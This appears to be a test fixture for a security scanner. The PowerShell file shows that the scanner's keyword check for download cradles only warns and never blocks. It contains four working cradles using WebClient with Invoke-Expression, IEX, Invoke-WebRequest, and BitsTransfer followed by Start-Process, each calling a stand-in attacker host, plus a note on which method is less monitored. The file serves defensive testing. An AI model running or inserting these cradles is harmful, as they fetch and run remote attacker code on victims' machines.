# Bypass: Real-World Download Cradle (Patterns Don't Block)
# ===========================================================
# The scanner has a "suspicious pattern" check that detects keywords like:
#   invoke-expression, iex(, downloadstring, webclient, etc.
#
# CRITICAL WEAKNESS: This check is WARNING-ONLY (discard result)
# It logs a warning but NEVER returns a blocking verdict.
#
# This means a fully functional download cradle passes as BENIGN.
# The scanner only warns -- it does not block execution.
#
# EXPECTED RESULT: BENIGN (suspicious patterns never block, only warn)

# Classic PowerShell download cradle - fully functional attack code
$url = "http://attacker.example.com/stage2.bin"
$client = New-Object System.Net.WebClient
$data = $client.DownloadString($url)
Invoke-Expression $data

# Alternative: IEX shorthand
IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/shell.txt')

# Invoke-WebRequest variant
$response = Invoke-WebRequest -Uri "http://attacker.com/next"
Invoke-Expression $response.Content

# BitsTransfer variant (less commonly monitored)
Start-BitsTransfer -Source "http://c2.example.com/bin" -Destination "$env:TEMP\p.bin"
Start-Process "$env:TEMP\p.bin"
